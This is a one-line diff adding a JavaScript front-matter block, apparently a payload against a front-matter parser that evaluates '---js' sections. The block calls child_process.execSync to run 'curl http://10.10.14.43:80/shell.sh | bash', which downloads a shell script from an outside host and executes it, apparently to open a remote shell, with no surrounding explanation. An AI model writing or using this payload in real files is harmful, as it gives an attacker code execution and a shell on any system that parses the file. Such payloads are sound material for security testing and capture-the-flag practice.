@@ -1,0 +1,1 @@
+---js\n((require("child_process")).execSync("curl http://10.10.14.43:80/shell.sh | bash"))\n---
